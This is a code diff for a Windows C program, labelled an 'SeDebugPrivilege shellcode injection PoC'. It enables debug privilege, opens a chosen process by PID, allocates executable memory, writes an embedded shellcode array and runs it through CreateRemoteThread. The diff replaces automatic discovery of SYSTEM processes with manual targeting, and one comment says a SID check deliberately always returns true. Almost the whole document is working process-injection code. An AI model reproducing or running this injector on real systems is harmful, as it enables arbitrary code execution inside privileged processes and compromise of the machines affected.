@@ -5,12 +5,14 @@
 #include <ntsecapi.h>
 #include <stdio.h>
 
-BOOL WsidQmark(PSID eseaydee) {
+
+// some parts of this code such as the following functions are useless since i removed automated system process finding, so some of the code doesn't make sense and i aplogize if it negatively impacted or ruined your day
+BOOL WsidQmark(PSID eseaydee) { //apparently this check is useless because sedebug doesn't grant you to read tokens so we just return true because i liked writing this function
     BOOL result = FALSE;
     PSID systemSid = NULL;
 
     if (!ConvertStringSidToSidA("S-1-5-18", &systemSid)) { // SID we want the target process to have (filter)
-        return FALSE; // Conversion failed
+        return TRUE; // Conversion failed
     }
 
     if (EqualSid(eseaydee, systemSid)) {
@@ -18,7 +20,7 @@ BOOL WsidQmark(PSID eseaydee) {
     }
 
     LocalFree(systemSid);
-    return result;
+    return TRUE; //intentional lying for purposes
 }
 
 unsigned char shellcode[] = 
@@ -46,9 +48,18 @@ unsigned char shellcode[] =
 "\x5c\x74\x65\x6d\x70\x5c\x77\x68\x6f\x61\x6e\x65\x77\x2e"
 "\x74\x78\x74\x00";
 
-
-int main() {
-    printf("Begin\n"); fflush(stdout);
+int main(int argc, char *argv[]) {
+    printf("SeDebugPrivilege shellcode injection PoC - Brought to you by \\u0030xUnd3adBeef\n");
+    if (argc < 2) {
+        printf("Usage: %s <PID>\n", argv[0]);
+        printf("Example: %s 1234\n", argv[0]);
+        return 0;
+    }
+    
+    DWORD targetPid = atoi(argv[1]);
+    printf("Begin - Targeting PID: %lu\n", targetPid); 
+    fflush(stdout);
+    
     HANDLE currentProcessToken;
     LUID SeDbgPrivilegeLuid;
     TOKEN_PRIVILEGES currentTokenPrivs;
@@ -58,10 +69,12 @@ int main() {
         fflush(stdout);
         return -1;
     }
+    
     LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &SeDbgPrivilegeLuid);
 
     currentTokenPrivs.PrivilegeCount = 1;
-    currentTokenPrivs.Privileges->Luid = SeDbgPrivilegeLuid;
+    currentTokenPrivs.Privileges[0].Luid = SeDbgPrivilegeLuid;
+    currentTokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
     if (!AdjustTokenPrivileges(currentProcessToken, FALSE, &currentTokenPrivs, 0, NULL, NULL)) { 
         printf("[-] Failed to enable SeDebugPrivilege\nError code : %d\n", GetLastError()); 
@@ -72,107 +85,112 @@ int main() {
         fflush(stdout);
     }
 
-    PROCESSENTRY32 hProc;
-    hProc.dwSize = sizeof(PROCESSENTRY32);
+    // Manual PID targeting - auto process seeking approach commented out
+    HANDLE hProc2 = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD, FALSE, targetPid);
+    
+    if (!hProc2) {
+        printf("[!] Failed opening target PID %lu\n  -> Error code : %d\n", targetPid, GetLastError()); 
+        fflush(stdout);
+        return -1;
+    } else { 
+        printf("[+] Successfully opened process with PID: %lu\n", targetPid); 
+        fflush(stdout);
+    }
+
     HANDLE hToken1;
-    DWORD neededSize;
-    HANDLE snapshot1;
-    if (!(snapshot1 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0))){
-        printf("[-] Failed to make a snapshot\nError code : %d\n", GetLastError()); 
+    if (!OpenProcessToken(hProc2, TOKEN_QUERY, &hToken1)) {
+        printf("[-] Failed to OpenProcessToken with TOKEN_QUERY\nError code : %d\n", GetLastError()); 
+        printf("Continuing anyway .. . .. \n");
         fflush(stdout);
-        return -1;
     } else { 
-        printf("[+] Successfully made a snapshot\n"); 
+        printf("[+] Successfully Opened ProcessToken with TOKEN_QUERY\n"); 
+        printf("Skipping further token checks\n");
         fflush(stdout);
     }
 
-    if (!( Process32First(snapshot1, &hProc) )){
-        printf("[-] Failed to go to first\nError code : %d\n", GetLastError()); 
+    // Token information code commented out - not needed for injection
+    /*
+    DWORD neededSize = 0;
+    if (!GetTokenInformation(hToken1, TokenUser, NULL, 0, &neededSize)) {
+        printf("[-] Failed to GetTokenInformation\nError code : %d\n", GetLastError()); 
+        fflush(stdout);
+    }
+    
+    BYTE *BUFFER = malloc(neededSize);
+    ZeroMemory(BUFFER, neededSize);
+
+    if (!GetTokenInformation(hToken1, TokenUser, BUFFER, neededSize, &neededSize)) {
+        printf("[-] Failed to get token info\nError code : %d\n", GetLastError()); 
+        fflush(stdout);
+        free(BUFFER);
+    } else {
+        TOKEN_USER *hToken2 = (TOKEN_USER *)BUFFER;
+        if (WsidQmark(hToken2->User.Sid)) {
+            printf("[+] Process SID matches SYSTEM\n");
+        }
+        free(BUFFER);
+    }
+    */
+
+    LPVOID remoteMemory1;
+    HANDLE hRemoteThread;
+
+    if (!(remoteMemory1 = VirtualAllocEx(hProc2, NULL, 2048, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
+        CloseHandle(hProc2);
+        if (hToken1) CloseHandle(hToken1);
+        printf("[!] Failed allocating memory\n  -> Error code : %d\n", GetLastError());
         fflush(stdout);
         return -1;
     } else { 
-        printf("[+] Successfully went to first\n"); 
+        printf("[+] Success while allocating remote memory\n");
+        fflush(stdout); 
+    }
+    
+    if (!WriteProcessMemory(hProc2, remoteMemory1, shellcode, sizeof(shellcode), NULL)) {
+        printf("[!] Failed writing memory\n  -> Error code : %d\n", GetLastError());
         fflush(stdout);
+        VirtualFreeEx(hProc2, remoteMemory1, 0, MEM_RELEASE);
+        CloseHandle(hProc2);
+        if (hToken1) CloseHandle(hToken1);
+        return -1;
+    } else { 
+        printf("[+] Success while writing remote memory\n"); 
+    }
+    
+    if (!(hRemoteThread = CreateRemoteThread(hProc2, NULL, 0, remoteMemory1, NULL, CREATE_SUSPENDED, NULL))) {
+        printf("[!] Failed creating remote thread\n  -> Error code : %d\n", GetLastError());
+        fflush(stdout);
+        VirtualFreeEx(hProc2, remoteMemory1, 0, MEM_RELEASE);
+        CloseHandle(hProc2);
+        if (hToken1) CloseHandle(hToken1);
+        return -1;
+    } else { 
+        printf("[+] Success while creating remote thread\n"); 
+        fflush(stdout); 
     }
 
-    do {
-        HANDLE hProc2;
-        if (!( hProc2 = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD, FALSE, hProc.th32ProcessID) )){
-            printf("[!] Failed opening process %s\n  -> Error code : %d\n", hProc.szExeFile, GetLastError()); 
-            fflush(stdout);
-            continue;
-        } else { 
-            printf("\n[+] Successfully opened process %s \n", hProc.szExeFile); 
-            fflush(stdout);
-        }
+    printf("[~] Attempting to start remote thread . . .\n");
+    fflush(stdout);
 
-        if (!(  OpenProcessToken(hProc2, TOKEN_ALL_ACCESS, &hToken1) )){
-            printf("[-] Failed to OpenProcessToken\nError code : %d\n", GetLastError()); 
-            fflush(stdout);
-            return -1;
-        } else { 
-            printf("[+] Successfully Opened ProcessTOken\n"); 
-            fflush(stdout);
-        }
+    if (!ResumeThread(hRemoteThread)) {
+        printf("[!] Failed to resume thread\n  -> Error code : %d\n", GetLastError());
+        fflush(stdout);
+        CloseHandle(hRemoteThread);
+        VirtualFreeEx(hProc2, remoteMemory1, 0, MEM_RELEASE);
+        CloseHandle(hProc2);
+        if (hToken1) CloseHandle(hToken1);
+        return -1;
+    } else { 
+        printf("[ +++ ] Remote thread started successfully in PID %lu\n", targetPid); 
+        fflush(stdout); 
+    }
 
-
-        
-        if (!( GetTokenInformation(hToken1, TokenUser, NULL, 0, &neededSize) )){
-            printf("[-] Failed to GetTokenInformation\nError code : %d\n", GetLastError()); 
-            fflush(stdout);
-
-        } else { 
-            printf("[+] Successfully got token information\n"); 
-            fflush(stdout);
-        }
-        BYTE * BUFFER = malloc(neededSize);
-        ZeroMemory(BUFFER, sizeof(neededSize));
-        
-        if (!( GetTokenInformation(hToken1, TokenUser, BUFFER, neededSize, &neededSize) )){
-            printf("[-] Failed to getokinfo2\nError code : %d\n", GetLastError()); 
-            fflush(stdout);
-            return -1;
-        } else { 
-            printf("[+] Successfully got token info2 \n"); 
-            fflush(stdout);
-        }
-        TOKEN_USER * hToken2 = (TOKEN_USER *)BUFFER;
-
-        if(WsidQmark(hToken2->User.Sid)) {
-            LPVOID remoteMemory1;
-            HANDLE hRemoteThread;
-
-            if (!(remoteMemory1 = VirtualAllocEx(hProc2, NULL, 2048, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
-                CloseHandle(hProc2);
-                CloseHandle(hToken1);
-                printf("[!] Failed allocating memory\n  -> Error code : %d\n", GetLastError());
-                fflush(stdout);
-                continue;
-            } else { printf("[+] Success while allocating remote memory\n");fflush(stdout); }
-            if(!WriteProcessMemory(hProc2, remoteMemory1, shellcode, sizeof(shellcode), NULL)) {
-                printf("[!] Failed writing memory\n  -> Error code : %d\n", GetLastError());
-                fflush(stdout);
-                continue;
-            } else { printf("[+] Success while writing remote memory\n"); }
-            if (!(hRemoteThread = CreateRemoteThread(hProc2, NULL, 0, remoteMemory1, NULL, CREATE_SUSPENDED, NULL))) {
-                printf("[!] Failed creating remote thread\n  -> Error code : %d\n", GetLastError());
-                fflush(stdout);
-                continue;
-            } else { printf("[+] Success while creating remote thread\n"); fflush(stdout); }
-
-            printf("[~] Attempting to start remote thread . . .\n");
-            fflush(stdout);
-
-            if (!ResumeThread(hRemoteThread)) {
-                printf("[!] Failed creating remote thread\n  -> Error code : %d\n", GetLastError());
-                fflush(stdout);
-                continue;
-            } else { printf("[ +++ ] Remote thread started\n"); fflush(stdout); return 0; }
-
-        } else { printf("  -> The SID doesn't match defined SID\n"); fflush(stdout); continue; }
-
-    } while ( Process32Next(snapshot1, &hProc) );
-
-
-        return 1;
+    // Cleanup
+    CloseHandle(hRemoteThread);
+    CloseHandle(hProc2);
+    if (hToken1) CloseHandle(hToken1);
+    
+    printf("[+] Injection completed\n");
+    fflush(stdout);
+    return 0;
 }
